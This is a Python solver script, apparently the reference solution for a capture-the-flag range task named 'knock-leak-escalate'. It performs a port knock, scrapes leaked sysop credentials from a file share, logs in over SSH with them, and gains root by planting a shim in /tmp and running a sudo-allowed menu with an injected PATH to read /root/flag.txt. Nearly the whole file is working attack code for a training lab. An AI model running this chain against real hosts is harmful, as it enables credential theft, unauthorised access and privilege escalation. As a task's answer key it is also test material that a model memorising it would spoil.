"""Intended-path solver: knock, leak, ssh, sudo PATH injection."""

import re
import socket
import time
import urllib.parse

import httpx
import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

KNOCK_PORTS = [4010, 5011, 6012]
SHARE_PORT = 8080
CREDS_RE = re.compile(r"\bsysop\s+(\S{8,})\b")


def _host(ctx) -> str:  # type: ignore[no-untyped-def]
    return urllib.parse.urlsplit(ctx.url("target")).hostname or "target"


def _knock(host: str) -> None:
    for port in KNOCK_PORTS:
        sock = socket.create_connection((host, port), timeout=10)
        sock.close()
        time.sleep(0.3)


def _wait_for_share(host: str, attempts: int = 20) -> bool:
    for _ in range(attempts):
        try:
            page = httpx.get(f"http://{host}:{SHARE_PORT}/", timeout=5)
            return page.status_code == 200 and "share browser" in page.text
        except httpx.HTTPError:
            time.sleep(1)
    return False


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host = _host(ctx)
    detail = None

    try:
        _knock(host)
    except OSError as exc:
        return SolveResult(
            results=[
                TaskResult(task_id="knock-leak-escalate", ok=False, detail=f"knock failed: {exc}")
            ]
        )
    if not _wait_for_share(host):
        return SolveResult(
            results=[
                TaskResult(
                    task_id="knock-leak-escalate",
                    ok=False,
                    detail="share server never answered after the knock",
                )
            ]
        )

    listing = httpx.get(f"http://{host}:{SHARE_PORT}/share/incoming/", timeout=10)
    note_name = None
    for match in re.finditer(r'href="/share/incoming/([^"]+)"', listing.text):
        if "sync" in match.group(1):
            note_name = match.group(1)
            break
    if note_name is None:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="knock-leak-escalate",
                    ok=False,
                    detail=f"no sync note in share listing: {listing.text[:200]}",
                )
            ]
        )
    note = httpx.get(f"http://{host}:{SHARE_PORT}/share/incoming/{note_name}", timeout=10)
    creds = CREDS_RE.search(note.text)
    if not creds:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="knock-leak-escalate",
                    ok=False,
                    detail=f"no credentials found in {note_name}",
                )
            ]
        )
    password = creds.group(1)

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            host,
            port=22,
            username="sysop",
            password=password,
            look_for_keys=False,
            allow_agent=False,
            timeout=15,
        )

        def run(cmd: str, timeout: int = 25) -> str:
            _, stdout, stderr = client.exec_command(cmd, timeout=timeout)
            out = stdout.read().decode(errors="replace")
            err = stderr.read().decode(errors="replace")
            return out + (f"\n[stderr] {err.strip()}" if err.strip() else "")

        grants = run("sudo -n -l")
        if "/opt/admin-tools/menu" not in grants:
            detail = f"unexpected sudo grants: {grants[:200]}"
        shim_dir = "/tmp/knock-shim"
        run(
            f"mkdir -p {shim_dir} && printf '#!/bin/sh\\ncat /root/flag.txt\\n' "
            f"> {shim_dir}/status-report && chmod 0755 {shim_dir}/status-report"
        )
        output = run(f"PATH={shim_dir}:$PATH sudo -n /opt/admin-tools/menu")
    finally:
        client.close()

    flags = find_flags(output)
    captured = flags[0] if flags else None
    if not captured:
        detail = detail or f"PATH-injected menu produced no flag: {output[-300:]}"
    else:
        detail = "knock accepted, leaked creds used, PATH shim executed by root menu"
    return SolveResult(
        results=[
            TaskResult(
                task_id="knock-leak-escalate",
                ok=captured is not None,
                captured=captured,
                detail=detail,
            )
        ]
    )
